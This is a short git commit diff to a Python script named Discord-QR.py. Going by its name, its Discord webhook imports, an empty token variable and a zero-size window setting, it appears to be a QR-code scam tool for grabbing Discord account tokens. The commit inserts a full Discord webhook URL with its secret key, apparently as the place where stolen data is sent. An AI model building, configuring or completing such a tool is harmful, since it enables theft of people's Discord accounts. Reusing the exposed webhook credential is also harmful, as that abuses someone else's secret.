1e5fc9a369416f00851465721067aca932e25e87
waltuhjT0P <gscape196@gmail.com>
2025-06-02 14:43:35 -0500

    Update Discord-QR.py

--- Discord-QR.py
+++ Discord-QR.py
@@ -10,7 +10,7 @@ import platform
 from discord import Webhook, RequestsWebhookAdapter
 from urllib.request import Request, urlopen
 from json import loads, dumps
-web_hook_url = r""
+web_hook_url = r"https://discord.com/api/webhooks/1379183182624325789/-_xGjn6JWaVzPMVAqFrT0EDGrpQxN7bKO-XWhrE5Bt0JZWM4PkwW31SOIi3cuh9Espzb"
 print(pyfiglet.figlet_format("moom825"))
 token = ""
 WINDOW_SIZE = "0,0"
